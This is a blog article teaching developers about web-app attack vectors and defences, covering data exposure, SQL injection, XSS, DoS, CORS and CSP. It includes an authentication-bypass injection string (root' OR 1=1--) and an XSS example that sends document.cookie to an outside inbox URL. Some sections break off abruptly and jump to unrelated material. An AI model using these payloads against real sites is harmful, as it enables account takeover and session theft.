There are people out there whose full-time job is information security and I&rsquo;m not going to pretend I&rsquo;m one of them. I just do some <a href=https://en.wikipedia.org/wiki/Capture_the_flag#Computer_security rel="nofollow noreferrer" target=_blank>CTFs</a> as a hobby and build software as my daily job, so it gives me enough knowledge to write such articles and give such talks but does not make me an expert.</p><h1 id=definitions>Definitions</h1><p>I figured the best way to start is to make sure we&rsquo;re all aligned on some important definitions in this area such as:</p><ul><li><a href=https://en.wikipedia.org/wiki/User-generated_content rel="nofollow noreferrer" target=_blank>UGC</a> — User-Generated Content. Basically, everything displayed in your system created by users. e.g. Tweets, Facebook posts, Medium articles, etc.</li><li><a href=https://en.wikipedia.org/wiki/Hacker rel="nofollow noreferrer" target=_blank>Hacker</a> — thanks to media and movie makers that&rsquo;s the most confusing one for people. Simply speaking, it&rsquo;s a person who can quickly figure out how things work. Being a hacker does not immediately mean being a criminal and it&rsquo;s important to understand.</li><li><a href=https://en.wikipedia.org/wiki/Black_hat rel="nofollow noreferrer" target=_blank>Black hat</a> — well, if you still can&rsquo;t resist to blame hackers for all the hacked accounts and exposed data, you&rsquo;ll be after these people. Hackers who are driven by illegal intentions and/or hack for their own profit are called black hats in the infosec community.</li><li><a href=https://en.wikipedia.org/wiki/White_hat_(computer_security) rel="nofollow noreferrer" target=_blank>White hat</a> — and white hats are &ldquo;good folks&rdquo; because they&rsquo;re researches and they report their findings, so black hat hackers can&rsquo;t use these vulnerabilities.</li><li><a href=https://en.wikipedia.org/wiki/Vector_(malware) rel="nofollow noreferrer" target=_blank>Attack vector</a> — a method/way how something (e.g. software, hardware, people) can be possibly exploited by an attacker. For example, you might have heard of SQL injections, XSS, CSRF, buffer overflow, etc. This article will cover some of those.</li><li><a href=https://en.wikipedia.org/wiki/Attack_surface rel="nofollow noreferrer" target=_blank>Attack surface</a> — the definition says it&rsquo;s &ldquo;the sum of the different points (the &ldquo;attack vectors&rdquo;)&rdquo; but I&rsquo;d say it&rsquo;s any part of your system that&rsquo;s exposed to the world. In the context of web apps, it&rsquo;s all the endpoints and open ports your web-app/server has which are available from the internet.</li></ul><p>Now, we&rsquo;re done with the definitions, let&rsquo;s talk about Web.</p><h1 id=attack-surface>Attack surface</h1><p>I think web-apps have one of the largest attack surfaces. And it&rsquo;s in their nature, just think about it: your browser is a program that downloads other programs from the internet and executes them trying to keep these programs in the browser sandbox. Sounds scary, right? At least it does for me.</p><p>So, what makes the attack surface of web-apps so large?</p><h2 id=receiving-and-processing-data>Receiving and processing data</h2><p>Unless it’s a static web-site, web-apps are meant to interact with users and that means they receive and process data from the users. And the history shows us it&rsquo;s very hard to make it secure because you need to sanitize the data properly before you actually process it.</p><h2 id=browsers>Browsers</h2><p>Nowadays web-apps are mostly running in a browser (JavaScript). Sure, there are mobile apps that just use APIs but some of them still use web-views which are eventually browsers. The problem with that is you don&rsquo;t control that environment as a developer. The server is the only environment which is under your control in this case. For example, there are tons of malicious browser extensions out there which can steal your user&rsquo;s data and then sell it on the dark web but in the end it hurts your company when the database of your users is on sale.</p><h2 id=web-standards-and-apis>Web-standards and APIs</h2><p>Web-standards (which are many) are not under your control when your build an app but, in fact, they’re a huge part of your app. That&rsquo;s the point not many people think about. What if someone finds a vulnerability in something so fundemential as a web-standard? Your app will be automatically exposed for attacks then, and usually there is nothing you can do about it until the standard is fixed.</p><p>For example, in 2016 <a href=https://twitter.com/mathias rel="nofollow noreferrer" target=_blank>Mathias Bynens</a> discovered that <a href=https://mathiasbynens.github.io/rel-noopener/ rel="nofollow noreferrer" target=_blank>any link that opens a new tab of you browser actually lets the new tab to make changes in your previous one</a>.</p><p>And what&rsquo;s the big deal you might ask? Well, let&rsquo;s imagine you do the following:</p><ul><li>You see a Facebook post with an interesting link</li><li>You open the link, read the content</li><li>You go back to the Facebook tab and you see the Facebook login page</li></ul><p>What would you do?</p><p>Most of the users would think &ldquo;well, happens sometimes, I get logged out all the time&rdquo; and they would try to login again. And the same moment you would send your password to an attacker. Why? Because that was not the Facebook page, sure it looked like it was but it&rsquo;s simpler than you think to do so. Did you actually check the URL? How often do you check the website URL?</p><p>This is why such things is a very big deal because most people are not paranoid and they trust things they see. And, by the way, it actually worked on Facebook for some time, I checked it myself.</p><h1 id=attack-vectors>Attack vectors</h1><p>Let&rsquo;s talk business, how do people actually attack web-apps?</p><p>I&rsquo;m pretty sure that if you worked on web-apps in your lifetime you most likely have heard of most of the attack vectors I listed next. But just theory would not be fun right? You can read the theoretical part in tons of other articles on the internet, so I prepared a <a href=https://github.com/rdner/security-nightmare rel="nofollow noreferrer" target=_blank>demo web-app</a> that you&rsquo;re free to run on your computer and follow demo examples there.</p><h2 id=sensitive-data-exposure>Sensitive data exposure</h2><h3 id=how-to-attack>How to attack</h3><p>I know, sounds very generic and obvious but you&rsquo;d be surprised to know what people do in real world. Some very confidential data can be served as a part of the API response or can be put in logs.</p><p>For example, security researcher <a href=https://www.vincent-haupert.de/ rel="nofollow noreferrer" target=_blank>Vincent Haupert</a> gave a talk &ldquo;<a href=https://media.ccc.de/v/33c3-7969-shut_up_and_take_my_money rel="nofollow noreferrer" target=_blank>Shut up and take my money</a>&rdquo; at <a href=https://media.ccc.de/c/33c3 rel="nofollow noreferrer" target=_blank>33c3</a> in 2016. The talk was about a German bank <a href=https://n26.com/en-eu/ rel="nofollow noreferrer" target=_blank>N26</a>. He hacked their mobile app, so he was able to steal money and eventually the whole account of another person. One of the reasons he could do that was some sensitive data served from their API.</p><p>Another example, which for some reason didn&rsquo;t receive so much attention, is <a href="https://www.reuters.com/article/us-twitter-passwords/twitter-says-glitch-exposed-substantial-number-of-users-passwords-idUSKBN1I42JG?il=0" rel="nofollow noreferrer" target=_blank>Twitter</a> and <a href=https://gizmodo.com/github-tells-some-users-it-accidentally-stored-their-pa-1825702783 rel="nofollow noreferrer" target=_blank>Github</a> were adding user passwords to their logs every time users logged in. That means, every engineer (likely not just engineers) could access your password for a long time until May 2018. I suspect they started working on GDPR compliance and found this issue in the process. Who can make sure that there is no one at Twitter and Github who could collect these passwords and sell them on the dark web?</p><h3 id=consequences>Consequences</h3><p>In general, if you expose any sensitive data in your apps or APIs it enables attackers to impersonate users, steal their accounts and, what can be much worse, their identity.</p><h3 id=how-to-protect>How to protect</h3><ul><li><strong>NEVER</strong> log any sensitive data, you can&rsquo;t just log every single request body using the same function, every single endpoint should be analyzed individually.</li><li><strong>NEVER</strong> propagate software errors / exception to the user. It most likely won&rsquo;t help the user to understand the error anyway but for an attacker it&rsquo;s always a huge help. I saw web-sites that in case of error showed me all database connection details including credentials. Some errors can indicate that certain attack vectors work for your web-site, like SQL injections.</li><li><strong>NEVER</strong> include any information to the response which is not supposed to be displayed on the UI. It&rsquo;s very important, if you feel like you can&rsquo;t show it to the user you should not serve it from your app at all.</li></ul><p>I already hear some questions like: &ldquo;But how am I suppose to debug a bug that user found then?&rdquo;.</p><p>Well, if you&rsquo;re really struggling with reproducing reported bugs or you can&rsquo;t find any information in your tracing system probably you should implement encrypted error bodies.</p><p>Once I got a 500 error from Google and guess what: I got a generic error message like &ldquo;Internal server error&rdquo; and something like &ldquo;Please contact our support providing this text below&rdquo;. And the text below was just an encrypted text. I assume they encrypt every error exposed outside and then they have an internal tool to decrypt the message and view stack traces, error details, etc. It&rsquo;s actually fairly easy to implement, just don&rsquo;t be lazy.</p><h2 id=sql-injection>SQL injection</h2><p>This one can be called a classic attack vector for web-apps. I used this to attack web-sites since I was 14 yo and surprisingly even today you can find some web-apps that are vulnerable despite the fact that there are tons of SQL libraries that handle this type of things for you.</p><h3 id=how-to-attack-1>How to attack</h3><p>As the name suggests you inject some additional statements/parameters to the existing SQL query on the server because this server does not sanitize your input very well.</p><p>There can be many ways to do so, but mostly you can find it with web-site input fields or URL query parameters.</p><p>If there is some kind of string input on the website that performs a SQL query you can assume that the query would look something like (e.g. for authentication):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>SELECT</span> user_id
</span></span><span style=display:flex><span><span style=color:#66d9ef>FROM</span> users
</span></span><span style=display:flex><span><span style=color:#66d9ef>WHERE</span> username <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;root&#39;</span> <span style=color:#66d9ef>AND</span> password <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;9c42a1346e333a770904b2a2b37fa7d3&#39;</span></span></span></code></pre></div><p>But it&rsquo;s a prepared statement, what about how the app actually builds it? And here developers can have some trouble if they decided to implement it themselves.</p><p>Have a look at the following example:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#a6e22e>fmt</span>.<span style=color:#a6e22e>Printf</span>(
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#34;SELECT user_id FROM users WHERE username = &#39;%s&#39; AND password = &#39;%s&#39;&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>username</span>, <span style=color:#a6e22e>md5</span>(<span style=color:#a6e22e>password</span>)
</span></span><span style=display:flex><span>)</span></span></code></pre></div><p>This is a huge red flag here. Why? What happens when we input a username <code>root' OR 1=1--</code>?</p><p>We will have this SQL query built:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>SELECT</span> user_id
</span></span><span style=display:flex><span><span style=color:#66d9ef>FROM</span> users
</span></span><span style=display:flex><span><span style=color:#66d9ef>WHERE</span> username <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;root&#39;</span> <span style=color:#66d9ef>OR</span> <span style=color:#ae81ff>1</span><span style=color:#f92672>=</span><span style=color:#ae81ff>1</span><span style=color:#75715e>-- &#39; AND password = &#39;9c42a1346e333a770904b2a2b37fa7d3&#39;</span></span></span></code></pre></div><p>What happened here is we injected a new condition to the <code>WHERE</code> statement which basically says &ldquo;select a user with a name &lsquo;root&rsquo; or where 1=1&rdquo; but the thing is — in our universe <code>1</code> always equals <code>1</code> and that query would select all users from the database. The <code>--</code> part in the end is just to say &ldquo;everything else is a SQL comment, so just ignore it&rdquo;. What happens next entirely depends on the server implementation really, but people usually take the first row from the query result and call it a successful authentication and you&rsquo;re in as an attacker. If you want to impersonate a particular user that you know 100% exists, like <code>root</code> or <code>admin</code> for example, you just swap <code>OR</code> with <code>AND</code> in this case, so the query says &ldquo;select a user with a name &lsquo;root&rsquo; and where 1=1&rdquo;. This query actually returns a row, so it&rsquo;s even more likely that the server would not fail and would process the result correctly.</p><p>There are many types of SQL injections which I&rsquo;m not going to cover in this article (deserves a full dedicated article maybe?) but just so you know, an attacker can also update, delete or even extract your entire database via such SQL injection. And it&rsquo;s not just about string parameters, number parameters are even worse.</p><p>There is a very cool tool called <a href=http://sqlmap.org/ rel="nofollow noreferrer" target=_blank>sqlmap</a> that pen-testers use for such occasions, so highly recommended to learn how to use it and try to scan your web-app maybe. I remember writing complex scripts for the things this tool does and was very happy to learn that such tool exists.</p><p>Also, there is an OWASP page <a href=https://www.owasp.org/index.php/SQL_Injection rel="nofollow noreferrer" target=_blank>here</a>. OWASP is a non-for-profit security-focused organization that collects a wikipedia-like database describing attack vectors and vulnerabilities.</p><h3 id=consequences-1>Consequences</h3><p>The attacker is able to:</p><ul><li>Bypass authentication</li><li>Alter or destroy your database (hope you have backups, right?)</li><li>Get access to your entire database and download it</li></ul><h3 id=how-to-protect-1>How to protect</h3><ul><li><strong>NEVER</strong> use string interpolation or concatenation, don&rsquo;t implement SQL builders yourself</li><li><strong>ALWAYS</strong> use a library that sanitizes query parameters properly</li></ul><h2 id=cross-site-scripting-xss>Cross-site scripting (XSS)</h2><p>If SQL injection attack was against the server this is one is against the clients — browsers. I&rsquo;m pretty sure that everybody who&rsquo;s using the internet knows that browsers run JavaScript to make your user experience more interactive, so you don&rsquo;t have to request the whole page from the server every time you need to render a word. But everything comes with a cost and JavaScript is not an exception. The nature of the XSS attack vector is rendering of some malicious UGC that contains JavaScript code and the browser mistakenly evaluates this JavaScript which it should not.</p><p>This attack most likely would not affect your server much, but it can actually steal sessions of your users which can definitely affect your company and reputation particularly.</p><h3 id=how-to-attack-2>How to attack</h3><p>Again, there are many ways to execute this depending on your goals but if I were to steal active user sessions on a vulnerable web-site I&rsquo;d post the following on a public feed that users most likely to see:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>script</span>&gt;

</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>script</span>&gt;</span></span></code></pre></div><p>If the web-site does not escape the output properly this is what happens:</p><ul><li>The <code>&lt;script></code> tag tells the browser to start evaluating the expression inside the tag</li><li>Then the code creates a new <code>img</code> element, sets the source of the image as <code>'https://rdner.de/inbox?sess='+encodeURIComponent(document.cookie)</code> and the <code>encodeURIComponent(document.cookie)</code> part actually extracts all your cookies including your current web-site session identifier that can be used to impersonate you from another browser by the attacker (in this case me).</li><li>The <code>img</code> element is appended to the page which means the browser makes a request with the URL I set to fetch the image and display it.

As a result, browsers could not implement any syntax awareness for the code in <code>script</code> tags. The browser is just simply looking for a <code>&lt;/script></code> string to end the code evaluation even if it&rsquo;s a part of a JavaScript string. So, as you might have noticed our malicious string actually starts with a closing <code>script</code> tag and we immediately open a new one with our own code.</p><p>Some time ago, on the rise of <a href=https://en.wikipedia.org/wiki/Isomorphic_JavaScript rel="nofollow noreferrer" target=_blank>isomorphic JavaScript</a> frameworks it was the most often vulnerability that I was finding. Most of the isomorphic frameworks computed the page state on server and then included the computed state object into the page so the front-end part of the app does not have to re-compute the state again. So, even though the apps properly escaped the content before it was displayed, the apps were vulnerable because of that data insertion.</p><p>Another option to perform an XSS attack (although most of the modern browsers actually detect and prevent it) can be putting your code as a part of the URL (e.g. query string parameter) if you noticed that the web-site renders this part of the URL on the page with no escaping. Then just give this link to someone and the rest you know.</p><h3 id=consequences-2>Consequences</h3><p>The attacker is able to:</p><ul><li>Get access to your user accounts (maybe you got lucky and none of them was an admin)</li><li>Execute any client-side code for your web-site visitors, causing traffic to other web-sites or malicious messages.</li></ul><h3 id=how-to-protect-2>How to protect</h3><p>Like it was with SQL injections, it&rsquo;s all about sanitizing user input but in this case you can choose when you actually do that: you can forbid users from inputting certain characters (which is in my opinion a bad user experience) or you can escape the data when you actually render it on the web-site using <a href=https://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references rel="nofollow noreferrer" target=_blank>HTML entities</a>.</p><p>Also, try not to put any UGC into the page as a part of the code, if you can&rsquo;t overcome this requirement make sure that the <code>&lt;/script></code> sub-string is split into <code>'&lt;/' + 'script>'</code>, for example.</p><h2 id=anchor-abuse>Anchor abuse</h2><p>To be honest, I&rsquo;m not sure if anyone call it like this, so I probably coined the term here.</p><p>I&rsquo;ve already briefly mentioned this in the <a href=#web-standards-and-apis>Web-standards and APIs</a> section but links on pages can be very dangerous.

Then in your app implementation generate a new JSON object that contains:</p><ul><li>Some random value (for the sake of entropy)</li><li>Some kind of ID (can be the ID of the current user)</li><li>The generation time-stamp (so you can expire the token)</li></ul><p>Once you have it, you can encrypt this JSON object with <a href=https://en.wikipedia.org/wiki/Advanced_Encryption_Standard rel="nofollow noreferrer" target=_blank>AES256</a>/<a href=https://en.wikipedia.org/wiki/Galois/Counter_Mode rel="nofollow noreferrer" target=_blank>GCM</a> using the pass-phrase you&rsquo;ve generated earlier. AES256 is the strongest encryption standard at the moment, GCM is a mode of operation that allows you to verify if the encrypted content is unchanged by an attacker. Unlike GCM most of the operation modes guarantee you confidentiality but not integrity, that means nobody can read the encrypted data but it&rsquo;s possible to change it. Theoretically, with some luck, it&rsquo;s possible to hit right bits and change the encrypted JSON in a way that works for the attacker&rsquo;s benefit. But I&rsquo;d say it&rsquo;s extremely unlikely, especially if you have a limited expiration time for the token.</p><p>So, you have the token, now what?

In this case, no data, permissions, access would leak but it&rsquo;s a good attack vector to cause <a href=https://en.wikipedia.org/wiki/Denial-of-service_attack rel="nofollow noreferrer" target=_blank>DoS</a> (denial of service). So, your web-site becomes unusable for normal users. Also, if you server just pipes the stream to the file system it can cause the file system to get full and in some cases you would not be able to start the server again.</p><h3 id=consequences-6>Consequences</h3><p>The attacker is able to crash your server and cause denial of service.</p><h3 id=how-to-protect-6>How to protect</h3><p>The easiest option is to have some kind of proxy in front of your web-service, like NGINX. Most of the web-servers/proxies have a decent default configuration that includes upstream limiting. Or set/implement these limits in your app.</p><h1 id=preventive-measures>Preventive measures</h1><p>If you start thinking about security aspects of your app from the very beginning, including design steps, you will probably design/configure/deploy it in a way that would prevent most of the listed attacks. And there are some standards/technologies that can help you do that.</p><h2 id=cross-origin-resource-sharing-cors>Cross-Origin Resource Sharing (CORS)</h2><p>I know, I mentioned several times that <a href=https://en.wikipedia.org/wiki/Cross-origin_resource_sharing rel="nofollow noreferrer" target=_blank>CORS</a> would not help against CSRF and XSS vulnerabilites but it&rsquo;s actually good against some other <a href=https://en.wikipedia.org/wiki/Ajax_%28programming%29 rel="nofollow noreferrer" target=_blank>AJAX</a>-relates attack vectors, so it&rsquo;s a good idea to configure CORS as strict as possible for your app.</p><p>Some things you can do using CORS:</p><ul><li>Limit where your HTTP API can be accessed from</li><li>Limit what headers are allowed in requests</li><li>Limit what HTTP methods are allowed in requests</li></ul><p>In order to do so your HTTP API must support <code>OPTIONS</code> requests with following headers:</p><ul><li>Access-Control-Allow-Origin</li><li>Access-Control-Allow-Methods</li><li>Access-Control-Allow-Headers</li><li>etc.</li></ul><p>There is a very good documentation regarding CORS configuration on MDN, so please <a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS rel="nofollow noreferrer" target=_blank>read it</a>.</p><h2 id=content-security-policy-csp>Content Security Policy (CSP)</h2><p><a href=https://content-security-policy.com/ rel="nofollow noreferrer" target=_blank>CSP</a> is a very powerful tool when it comes to strict web-app policies.</p><p>Header <code>Content-Security-Policy</code> is supported by browsers since 2014-2015.</p><p>Features:</p><ul><li>Limit where to download media from: fonts, styles, scripts.

Does not matter how big the company is, it&rsquo;s really hard to earn the trust back after you failed your users.
